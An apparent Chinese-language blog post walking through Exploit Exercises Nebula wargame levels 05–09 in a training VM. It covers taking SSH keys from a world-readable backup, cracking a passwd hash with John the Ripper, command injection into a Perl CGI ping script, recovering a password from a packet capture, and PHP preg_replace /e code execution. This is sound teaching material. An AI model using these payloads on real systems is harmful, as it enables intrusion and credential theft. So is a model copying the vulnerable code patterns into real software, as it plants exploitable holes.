<!DOCTYPE html>
<html lang="zh-cn">
<head>

    <title>  GreatYYX Blog - Exploit Exercises Nebula level05-09 Writeup
</title>

  <meta charset="utf-8">
  <link rel="dns-prefetch" href="http://yyx.com"/>
  <link rel="dns-prefetch" href="http://www.yyx.com"/>
  <link rel="dns-prefetch" href="http://blog.yyx.com"/>
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <meta name="author" content="GreatYYX">
  <meta name="robots" content="all">
  <meta name="generator" content="pelican,github,githubpage,jquery,bootstrap,pjax">
  <meta name="description" content="program,guitar,photo,information,security,ctf,writeup">
  <meta name="description" content="编程,开发,音乐,吉他,摄影,信息安全,极客">
  <meta name="baidu-site-verification" content="U9HmJyJXz6" />
  <link rel="shortcut icon" href="http://yyxname.qiniudn.com/theme/img/favicon.ico">
  
  <link rel="stylesheet" href="http://maxcdn.bootstrapcdn.com/bootstrap/3.2.0/css/bootstrap.min.css"/>
  <link rel="stylesheet" href="http://maxcdn.bootstrapcdn.com/font-awesome/4.2.0/css/font-awesome.min.css" />
  <link rel="stylesheet" href="http://yyxname.qiniudn.com/theme/css/main.min.css" />
  <style>.loader{background:url('http://yyxname.qiniudn.com/theme/img/loading.gif') no-repeat;}body.bgimg{background: #fff url('http://yyxname.qiniudn.com/theme/img/welcome_bg.jpg') no-repeat center center fixed;}</style>
  <!--[if lt IE 9]>
    <script src="http://cdn.bootcss.com/html5shiv/3.7.2/html5shiv.min.js"></script>
    <script src="http://cdn.bootcss.com/respond.js/1.4.2/respond.min.js"></script>
  <![endif]-->

  <link href="http://blog.yyx.name/feeds/all.atom.xml" type="application/atom+xml" rel="alternate" title="GreatYYX Blog Full Atom Feed" />
  <link href="http://blog.yyx.name/feeds/security.atom.xml" type="application/atom+xml" rel="alternate" title="GreatYYX Blog Categories Atom Feed" />


    <meta name="tags" contents="exploit-exercises,nebula,wargame,hacking,exploit" />

</head>

<body>


<div id="wrapper">
  <div id="nav-main" class="navbar navbar-inverse" role="navigation">
    <div class="container">
      <div class="navbar-header">
        <button type="button" class="navbar-toggle collapsed" data-toggle="collapse" data-target=".navbar-collapse">
          <span class="sr-only">Toggle navigation</span>
          <span class="icon-bar"></span>
          <span class="icon-bar"></span>
          <span class="icon-bar"></span>
        </button>
        <a data-pjax class="navbar-brand" href="http://blog.yyx.name/index.html">
          <img alt="Brand" height="60" width="60" src="http://yyxname.qiniudn.com/theme/img/logo.png">
        </a>
      </div>
      <div class="navbar-collapse collapse">

        <ul class="nav navbar-nav navbar-right">
          <li class="dropdown">
            <a href="#" class="dropdown-toggle" data-toggle="dropdown">Category <span class="caret"></span></a>
            <ul class="dropdown-menu" role="menu">
    <li><a data-pjax href="http://blog.yyx.name/category/security.html">Security</a></li>
    <li><a data-pjax href="http://blog.yyx.name/category/web.html">Web</a></li>
            </ul>
          </li>
          <li><a target="_blank" href="http://photo.yyx.name">Photography</a></li>
          <li><a data-pjax href="http://blog.yyx.name/pages/about.html">About</a></li>
          <li class="dropdown">
            <a href="#" class="dropdown-toggle" data-toggle="dropdown">
              <span class="glyphicon glyphicon-search"></span>
            </a>
            <ul class="dropdown-menu" role="menu">
              <li>
                <form class="navbar-form">
                <input id="search-input" type="text" class="form-control" placeholder="Search...">
                </form>
              </li>
            </ul>
          </li>
          <li class="dropdown">
            <a href="#" class="dropdown-toggle" data-toggle="dropdown">
              <span class="glyphicon glyphicon-share"></span>
            </a>
            <ul class="dropdown-menu" role="menu">
              <li><a href="http://weibo.com/u/1085956311" target="_blank"><i class="fa fa-weibo"></i>&nbsp;Weibo</a></li>
              <li><a href="http://github.com/GreatYYX"  target="_blank"><i class="fa fa-github"></i>&nbsp;Github</a></li>
            </ul>
          </li>

        </ul>
      </div>
    </div>
  </div><!-- /.navbar -->
    
  <div class="container" id="main-container">
    <div class="row row-offcanvas row-offcanvas-right">
<div id="blog-main" class="col-sm-8 blog-main">
  <h1 class="blog-post-title">Exploit Exercises Nebula level05-09 Writeup</h1>
  <p class="blog-post-meta">
    <i class="fa fa-clock-o"></i>&nbsp;2014-09-08
    &nbsp;&nbsp;|&nbsp;&nbsp;
    <i class="fa fa-folder-o"></i>&nbsp;<a data-pjax href="http://blog.yyx.name/category/security.html">Security</a>
  </p>
  <div class="blog-post" >
    <h1>Nebula level05</h1>
<blockquote>
<p>Check the flag05 home directory. You are looking for weak directory permissions</p>
<p>在flag05家目录下找弱权限控制。</p>
</blockquote>
<p>直接查flag05的home目录，发现.backup和.ssh文件很可疑，.ssh没权限，那就.backup。进去之后发现一个.tgz文件，解压之：</p>
<pre><code class="bash">tar zxf /home/flag05/.backup/backup-19072011.tgz -C ~/
</code></pre>

<p>此时在自己家目录下也有.ssh文件并具有了flag05的ssh登陆公私钥，这样就可以直接用flag05无密码登陆了。</p>
<pre><code class="bash">ssh flag05@localhost
</code></pre>

<p>你都是flag05了，做什么知道了吧~~</p>
<h1>Nebula level06</h1>
<blockquote>
<p>The flag06 account credentials came from a legacy unix system.</p>
<p>题目说flag06账户令牌的形式继承于已经被放弃的Unix。</p>
</blockquote>
<p>Unix没用过，好惭愧，也不知道什么验证的形式，反正我就直接<code>cat /etc/passwd | more</code>了，然后发现，flag06账户的密码字段不是<code>x</code>而是直接一堆值。Google一下发现，因为passwd的r权限太高（主要很多程序把它当用户数据表），因此Linux采用shadow存放密码，这样passwd里就变成x了（其实老师说过的，但是因为现在都是x，所以也就没留意这个问题）。</p>
<p>OK，既然拿到了flag06密码的密文，那就破解呗。上Kali或者BackTracer5，没这些系统的需要下载并编译<a href="http://www.openwall.com/john/">John the ripper</a>来跑字典。我在Kali环境中，把密码那段字符串<code>ueqwOCnSGdsuM</code>写入/root目录下的flag06passwd文件中（你也可以写整个flag06在passwd中的那行），之后：</p>
<pre><code class="bash">john ~/flag06passwd
</code></pre>

<p>基本上瞬间就跑出来密码是hello（赤裸裸的弱口令呀），登陆flag06去爽吧。</p>
<h1>Nebula level07</h1>
<blockquote>
<p>The flag07 user was writing their very first perl program that allowed them to ping hosts to see if they were reachable from the web server.</p>
<p>一个perl脚本，脚本实现了ping主机的功能。</p>
</blockquote>
<pre><code class="perl">#!/usr/bin/perl
use CGI qw{param};

print &quot;Content-type: text/html\n\n&quot;;

sub ping {
  $host = $_[0];

  print(&quot;&lt;html&gt;&lt;head&gt;&lt;title&gt;Ping results&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;pre&gt;&quot;);

  @output = `ping -c 3 $host 2&gt;&amp;1`;
  foreach $line (@output) { print &quot;$line&quot;; } 

  print(&quot;&lt;/pre&gt;&lt;/body&gt;&lt;/html&gt;&quot;);

}

# check if Host set. if not, display normal page, etc
ping(param(&quot;Host&quot;));
</code></pre>

<p>flag07家目录下有一个thttpf.conf（perl服务器配置）和index.cgi（就是这个脚本）。因此需要执行它。根据程序逻辑，传入的<code>Host</code>参数为ping的地址。漏洞利用思路很简单，传入地址后截断，并执行getflag的代码。</p>
<p>那就开始行动：首先需要看看perl的服务器跑起来没</p>
<pre><code class="bash">ps aux | grep thttpd
</code></pre>

<p>如果不幸没跑起来，那就用nebula登陆，之后：</p>
<pre><code class="bash">sudo -s
su flag07
/usr/sbin/thttpd -C /home/flag07/thttpf.conf
</code></pre>

<p>这样先把自己变成root，然后变成flag07，然后把服务器跑起来。当然记得切回level07继续做题。</p>
<p>之后<code>cat thttp.conf</code>发现端口是7007，需要打开界面测试了。因为服务器还没配置网络，无法从远程访问，本着能不配置就不配置的的原则（参见开篇），就用curl或者wget吧（因为这个Linux没有图形界面，因此没有浏览器）。很不幸，curl没有，那就wget吧~</p>
<p>首先测试一下界面：</p>
<pre><code class="bash">wget http://localhost:7007/index.cgi?Host=127.0.0.1 -O /home/level07/cgi.html
</code></pre>

<p>发现界面OK，之后插入做坏事的代码：</p>
<pre><code class="bash">wget http://localhost:7007/index.cgi?Host=127.0.0.1;/bin/getflag -O /home/level07/cgi.html
</code></pre>

<p>很不幸，报错。根据错误内容发现参数没有解析完，因此对参数用escape编码：</p>
<pre><code class="bash">wget http://localhost:7007/index.cgi?Host=127.0.0.1%3B/bin/getflag -O /home/level07/cgi.html
</code></pre>

<p>Done！</p>
<h1>Nebula level08</h1>
<blockquote>
<p>World readable files strike again. Check what that user was up to, and use it to log into flag08 account.</p>
<p>又一个全世界可读文件攻击。看看用户想干嘛，然后进入flag08账户。</p>
</blockquote>
<p>题目直接看懵了，什么叫world readable？</p>
<p>进入level08账户，切换到flag08目录，发现一个.pcap文件，恍然大悟，原来world readable是这个意思……所以说音乐啊美术啊也是world readable啊~好一个形容词。</p>
<p>既然是.pcap，那就得分析包。得先把.pcap搞出来到有图形界面的机器上。看来还是要配置网络（上一题白偷懒了，出来混，还是要还的T^T）。其实网络配置也很简单，因为非安装的系统，配个临时的网络配置就可以。进入nebula，之后：</p>
<pre><code class="bash">sudo ifconfig eth0 192.168.1.50 netmask 255.255.255.0
sudo ifconfig eth0 up
</code></pre>

<p>这样这台机器就有192.168.1.50了ip了，ping一下看看通不通（不通的话查看一下虚拟机的网卡是否开启）。</p>
<p>继续本着偷懒原则，如果不装软件怎么把这个文件拷贝出来呢。那先查查端口：</p>
<pre><code class="bash">netstat -anpt
</code></pre>

<p>没什么可用端口，不过看到非进程的22端口，想到了sftp。于是：</p>
<pre><code class="bash">which sftp
</code></pre>

<p>果然有sftp客户端，继续搜索服务器端，无果。不过没事，有客户端就够了。
在另一台有图形界面的Linux中开启SFTP（ip:192.168.1.200），之后在level08中执行：</p>
<pre><code class="bash">sftp root@192.168.1.200
put capture.pcap
</code></pre>

<p>然后在把capture.pcap拖到wireshark里面，开始分析包。预判应该是用户登录过程没加密，然后留下了登录密码之类的信息。所以不出意外应该是TCP包，于是Follow一下TCP包，一行大字映入眼帘</p>
<pre><code class="no-highlight">Password: backdoor...00Rm8.ate
</code></pre>

<p>根据经验，一般16进制工具中<code>.</code>都是代表<code>\0</code>，就是字符串结尾（其实<code>.</code>表示不可读字符，一般在一堆字符串中时基本就是<code>\0</code>），所以密码应该是backdoor。尝试登录，错误！于是在wireshark中吧TCP包切换到HEX显示，发现这段数据信息如下：</p>
<pre><code class="no-highlight">000000B9  62                  b
000000BA  61                  a
000000BB  63                  c
000000BC  6b                  k
000000BD  64                  d
000000BE  6f                  o
000000BF  6f                  o
000000C0  72                  r
000000C1  7f                  .
000000C2  7f                  .
000000C3  7f                  .
000000C4  30                  0
000000C5  30                  0
000000C6  52                  R
000000C7  6d                  m
000000C8  38                  8
000000C9  7f                  .
000000CA  61                  a
000000CB  74                  t
000000CC  65                  e
000000CD  0d                  .
</code></pre>

<p>竟然是7F，查ASCII码表发现7F是Backspace（退格），0D是CR（回车），所以就按照这个顺序重新比划了下，得到密码是backd00Rmate。此题拿下！</p>
<h1>Nebula level09</h1>
<blockquote>
<p>There's a C setuid wrapper for some vulnerable PHP code...</p>
<p>这是一个C用setuid包装后的脆弱的PHP代码……</p>
</blockquote>
<pre><code class="php">&lt;?php

function spam($email)
{
  $email = preg_replace(&quot;/\./&quot;, &quot; dot &quot;, $email);
  $email = preg_replace(&quot;/@/&quot;, &quot; AT &quot;, $email);

  return $email;
}

function markup($filename, $use_me)
{
  $contents = file_get_contents($filename);

  $contents = preg_replace(&quot;/(\[email (.*)\])/e&quot;, &quot;spam(\&quot;\\2\&quot;)&quot;, $contents);
  $contents = preg_replace(&quot;/\[/&quot;, &quot;&lt;&quot;, $contents);
  $contents = preg_replace(&quot;/\]/&quot;, &quot;&gt;&quot;, $contents);

  return $contents;
}

$output = markup($argv[1], $argv[2]);

print $output;

?&gt;
</code></pre>

<p>看到PHP，心中大喜，总算碰到一个相对熟悉的语言，老乡见老乡，两眼泪汪汪啊~~</p>
<p>flag09目录下有一个可执行的flag09（这就是所谓具有SetUID的C语言包装的PHP解释器吧），还有给出代码的flag09.php。代码逻辑还是很简单的，传入两个参数，一个是文件路径，一个没有用到。根据文件路径读出文件之后把Email那部分读出来，替换掉一些字符（反垃圾邮件），之后输出。</p>
<p>没看出什么有问题的地方，不过传入参数一定是可以利用的点。preg_replace中的e参数用的不多呀，一般都是用i（忽略大小写）。于是查PHP Manual，果不其然，e使preg_replace第二个参数变成函数执行，就和执行eval一样，另外这个参数太危险，在PHP5.5之后废除改用回调函数实现了。一句话木马暴露了！那就构造一下呗。</p>
<p>于是构造文件内容为:</p>
<pre><code class="no-highlight">[email abc@def.com\&quot;);system(\&quot;getflag]
</code></pre>

<p>照理说第二个参数应该被拼接成:</p>
<pre><code class="no-highlight">&quot;spam(\&quot;email abc@def.com\&quot;);system(\&quot;getflag\&quot;)&quot;
</code></pre>

<p>这样就能顺利执行两个函数了。很可惜，天不由人愿，整个东西都被当做字符串被扔到spam函数里了。所以这里如果要探究得看一下PHP源码中具体的处理过程。</p>
<p>顿时没思路了……之后Google一下php的preg_replace的e参数的漏洞，发现有利用<code>{${function()}}</code>的技巧。即在<code>{${}}</code>包裹后的函数会被执行。于是：</p>
<pre><code class="no-highlight">[email {${system('getflag')}}]
</code></pre>

<p>K.O！</p>
  </div><!-- /.blog-post -->
  
  <hr>

  <div id="tag-list" class="tag-list">
    <i class="fa fa-tags"></i>
    <a data-pjax href="http://blog.yyx.name/tag/exploit-exercises.html">exploit-exercises</a>
    <a data-pjax href="http://blog.yyx.name/tag/nebula.html">nebula</a>
    <a data-pjax href="http://blog.yyx.name/tag/wargame.html">wargame</a>
    <a data-pjax href="http://blog.yyx.name/tag/hacking.html">hacking</a>
    <a data-pjax href="http://blog.yyx.name/tag/exploit.html">exploit</a>
  </div>

    <!--comment-->
    <div id="disqus_thread"></div>
<script type="text/javascript">
    /* * * CONFIGURATION VARIABLES: EDIT BEFORE PASTING INTO YOUR WEBPAGE * * */
    var disqus_shortname = 'yyxblog'; // required: replace example with your forum shortname

    /* * * DON'T EDIT BELOW THIS LINE * * */
    (function() {
        var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
        dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
        (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
    })();
</script>
<noscript>Please enable JavaScript to view the <a href="http://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
<a href="http://disqus.com" class="dsq-brlink">comments powered by <span class="logo-disqus">Disqus</span></a>

</div><!-- /.blog-main -->

<div id="blog-sidebar" class="hidden-xs col-sm-3 col-sm-offset-1">
<div id="sidebar-fix">
    <!--toc-->
    <div class="sidebar-module">
      <!-- <h4>Table of Contents</h4> -->
      <div id="toc" class="toc"></div>
    </div>
</div><!-- ./sidebar-fix -->
</div><!-- /.blog-sidebar -->
    </div><!-- /.row -->
  </div><!-- /.container -->

  <div id="loading" class="fade"><div class="loader"></div></div>

  <div class="blog-footer">
    <p class="l">©2014&nbsp;<a href="#">GreatYYX</a>.&nbsp;&nbsp;
      <a rel="license" target="_blank" href="http://creativecommons.org/licenses/by-nc-sa/4.0/"><img alt="Creative Commons" style="border-width:0" src="http://i.creativecommons.org/l/by-nc-sa/4.0/80x15.png" /></a>
    </p>
  </div><!-- /.blog-footer -->

  <div class="float-tool">
    <a id="btn-comment" class="btn hide" title="Comments"><i class="fa fa-comment"></i></a>
    <a id="btn-top" class="btn hide" title="Top"><i class="fa fa-arrow-up"></i></a>
  </div><!-- /.float-tool -->

</div><!-- /.wrapper -->

  <script src="http://code.jquery.com/jquery-2.1.1.min.js"></script>
  <script src="http://code.jquery.com/ui/1.11.2/jquery-ui.min.js"></script>
  <script src="http://maxcdn.bootstrapcdn.com/bootstrap/3.2.0/js/bootstrap.min.js"></script>
  <script src="http://yyxname.qiniudn.com/theme/js/jquery.tocify.min.js"></script>
  <script src="http://yyxname.qiniudn.com/theme/js/highlight.pack.js"></script>
  <script src="http://yyxname.qiniudn.com/theme/js/jquery.pjax.min.js"></script>
  <script src="http://yyxname.qiniudn.com/theme/js/main.min.js"></script>

<div style="display:none">
<script src="http://s19.cnzz.com/z_stat.php?id=1253039383&web_id=1253039383" language="JavaScript"></script>
</div>
<script type="text/javascript">
(function(w,d,t,u,n,s,e){w['SwiftypeObject']=n;w[n]=w[n]||function(){
(w[n].q=w[n].q||[]).push(arguments);};s=d.createElement(t);
e=d.getElementsByTagName(t)[0];s.async=1;s.src=u;e.parentNode.insertBefore(s,e);
})(window,document,'script','//s.swiftypecdn.com/install/v1/st.js','_st');

_st('install','XwpC765YWzV58fvrdjoQ');
</script>
</body>
</html>